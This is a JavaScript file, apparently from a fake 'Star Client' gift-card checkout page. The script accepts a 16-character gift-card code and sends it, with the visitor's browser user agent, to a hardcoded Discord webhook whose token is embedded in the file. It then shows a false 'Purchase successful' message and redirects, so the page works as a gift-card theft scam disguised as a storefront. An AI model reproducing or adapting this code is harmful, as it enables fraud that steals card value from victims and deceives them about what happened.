const WEBHOOK_URL = "https://discord.com/api/webhooks/1453158342452187187/oYYnqUKNd_-3GbA_AE53w55gCfhjvMlB0HcItC53RieMvKPKXNG14Yz00MpUZVerybII";

function processGiftCard() {
  const code = document.getElementById("giftCard").value.trim().toUpperCase();
  const status = document.getElementById("status");

  const regex = /^[A-Z0-9]{16}$/;

  if (!regex.test(code)) {
    status.style.color = "red";
    status.textContent = "Invalid gift card format.";
    return;
  }

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "🧾 Star Client | Card Used",
        color: 0x5865F2,
        fields: [
          { name: "Gift Card", value: code },
          { name: "Action", value: "Purchase Checkout" },
          { name: "Device", value: navigator.userAgent }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Purchase successful. Redirecting…";

  setTimeout(() => {
    window.location.href = "redeem.html";
  }, 1500);
}
